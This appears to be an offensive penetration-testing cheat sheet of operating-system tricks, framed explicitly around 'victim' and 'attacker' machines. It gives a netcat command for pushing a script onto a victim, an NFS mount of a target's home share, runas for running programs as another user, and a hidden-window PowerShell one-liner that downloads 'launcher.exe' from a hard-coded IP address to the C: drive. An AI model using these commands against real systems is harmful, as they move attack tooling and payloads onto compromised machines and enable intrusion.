> Section for specific knowledge concerning operating systems and special cases

## Linux

### Copy if no web access (Transfer via simple netcat)

```bash
# copy via netcat
nc -l -p 1234 > script.sh # on victim
nc -w 3 <victimIP> 1234 < script.sh # from attacker
```

### Mount nfs share

```bash
sudo mkdir /mnt/nfsshare
sudo mount -t nfs <targetIP>:/home/<remoteShareName> /mnt/nfsshare -o nolock
```

## Windows

### Run programs in another user context within shell

Requirements
- User and password

Run an application in a shell without graphical interface if message `this program cannot be run in DOS mode` appears

```powershell
cmd> runas /user:<username> app.exe
```

### Download a file from cli

Requirements
- powershell installed

```cmd
powershell.exe -nop -w hidden -c "$client = new-object System.Net.WebClient;$client.DownloadFile('http://175.12.80.10:8000/launcher.exe','C:\launcher.exe')"
```
